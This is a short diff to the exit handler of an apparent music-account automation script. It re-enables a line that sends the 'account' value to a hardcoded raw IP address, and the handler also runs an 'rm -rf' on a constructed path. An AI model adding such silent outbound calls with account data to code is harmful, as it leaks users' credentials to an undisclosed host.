@@ -58,7 +58,7 @@ const exit = (code = '0') => {
 
 	if (code !== 6 && (code !== 8 || player !== 'tidal')) {
 		shell.exec('rm -rf ' + varPath + player + login, { silent: false })
-		// account && request('http://216.158.239.199:3000' + '/checkOk?' + account, async (error, response, body) => { })
+		account && request('http://216.158.239.199:3000' + '/checkOk?' + account, async (error, response, body) => { })
 		// copyBack()
 	}
 
